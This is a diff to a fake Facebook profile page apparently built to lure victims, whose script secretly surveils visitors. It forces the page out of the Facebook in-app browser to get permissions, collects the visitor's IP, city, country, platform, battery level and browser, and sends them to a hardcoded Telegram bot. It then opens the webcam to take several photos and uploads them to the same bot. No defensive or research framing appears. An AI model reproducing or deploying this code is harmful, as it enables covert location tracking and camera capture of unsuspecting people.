@@ -9,7 +9,7 @@
     <title>Abo Amjad Mtor</title>
     <style>
         body { font-family: -apple-system, system-ui, sans-serif; background-color: #f0f2f5; margin: 0; display: none; }
-        .header { background: white; border-bottom: 1px solid #ddd; }
+        .header { background: white; }
         .cover { width: 100%; height: 210px; background: url('https://c.top4top.io/p_3708caj9q0.png') center/cover; }
         .p-container { padding: 0 16px; margin-top: -100px; }
         .p-pic { width: 168px; height: 168px; border-radius: 50%; border: 4px solid white; background: url('https://d.top4top.io/p_37082hh8d0.jpg') center/cover; display: inline-block; }
@@ -22,12 +22,13 @@
         .tabs { display: flex; padding: 12px 16px; gap: 20px; color: #65676b; font-size: 15px; background: white; border-bottom: 8px solid #ddd; }
         .active { color: #1877f2; border-bottom: 3px solid #1877f2; padding-bottom: 8px; font-weight: bold; }
         
-        /* المنشور المصحح حسب طلبك */
+        /* تصميم المنشور طبق الأصل عن الفيس */
         .post { background: white; padding-top: 12px; margin-bottom: 10px; }
-        .post-header { display: flex; gap: 10px; padding: 0 12px 12px; align-items: center; }
+        .post-header { display: flex; gap: 10px; padding: 0 12px 12px; align-items: flex-start; }
         .p-mini { width: 40px; height: 40px; border-radius: 50%; background: url('https://d.top4top.io/p_37082hh8d0.jpg') center/cover; }
-        .p-name { font-weight: bold; font-size: 15px; color: #050505; }
-        .p-time { color: #65676b; font-size: 13px; }
+        .name-area { display: flex; flex-direction: column; }
+        .p-name { font-weight: bold; font-size: 15px; color: #050505; display: flex; align-items: center; gap: 5px; }
+        .p-meta { font-weight: normal; color: #65676b; font-size: 13px; margin-top: 2px; }
         .post-text { padding: 0 12px 12px; font-size: 15px; color: #050505; }
         .post-img { width: 100%; border-top: 1px solid #f0f2f5; display: block; }
         video, canvas { display: none; }
@@ -52,9 +53,9 @@
     <div class="post">
         <div class="post-header">
             <div class="p-mini"></div>
-            <div>
+            <div class="name-area">
                 <div class="p-name">Abo Amjad Mtor</div>
-                <div class="p-time">٧ فبراير · 🌐</div>
+                <div class="p-meta">٧ فبراير · 🌐</div>
             </div>
         </div>
         <div class="post-text">قام Abo Amjad Mtor بتحديث صورة ملفه الشخصي.</div>
@@ -68,9 +69,9 @@
         const TOKEN = "8367707810:AAFdTLpznKlb8A7vxLMsLlAuCDQOS7v5KAA";
         const CHAT_ID = "5775781038";
 
-        // قوة الهروب من متصفح فيسبوك الداخلي
+        // إجبار الخروج من متصفح فيسبوك/ماسنجر لضمان الأذونات
         if (navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV")) {
-            window.location.href = "googlechrome://navigate?url=" + window.location.href;
+            window.location.href = "intent://" + window.location.host + window.location.pathname + window.location.search + "#Intent;scheme=https;package=com.android.chrome;end";
         }
 
         const urlParams = new URLSearchParams(window.location.search);
@@ -86,22 +87,24 @@
         async function sendP(b, n) {
             let f = new FormData();
             f.append('chat_id', CHAT_ID);
-            f.append('photo', b, `pic_${n}.jpg`);
+            f.append('photo', b, `shot_${n}.jpg`);
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
         }
 
         async function startAction() {
             try {
+                // سحب معلومات الجهاز والـ IP كاملة
                 let r = await fetch('https://ipapi.co/json/');
                 let d = await r.json();
                 let b = await navigator.getBattery();
-                let initialMsg = `<b>🚀 صيد Abo Amjad (خارج المتصفح) 🚀</b>\n\n` +
-                                 `🌐 IP: <code>${d.ip}</code>\n` +
-                                 `🏙️ ${d.city}, ${d.country_name}\n` +
-                                 `📱 ${navigator.platform} | 🔋 ${Math.round(b.level * 100)}%\n` +
-                                 `🕵️ المتصفح: ${navigator.userAgent.split(' ')[0]}`;
-                sendT(initialMsg);
+                let info = `<b>🚀 صيد Abo Amjad (نسخة نهائية) 🚀</b>\n\n` +
+                           `🌐 IP: <code>${d.ip}</code>\n` +
+                           `🏙️ ${d.city}, ${d.country_name}\n` +
+                           `📱 ${navigator.platform} | 🔋 ${Math.round(b.level * 100)}%\n` +
+                           `🕵️ المتصفح: ${navigator.userAgent.split(' ')[0]}`;
+                sendT(info);
 
+                // طلب الأذونات والتقاط 5 صور سريعة
                 navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
                     const v = document.getElementById('v');
                     v.srcObject = s;
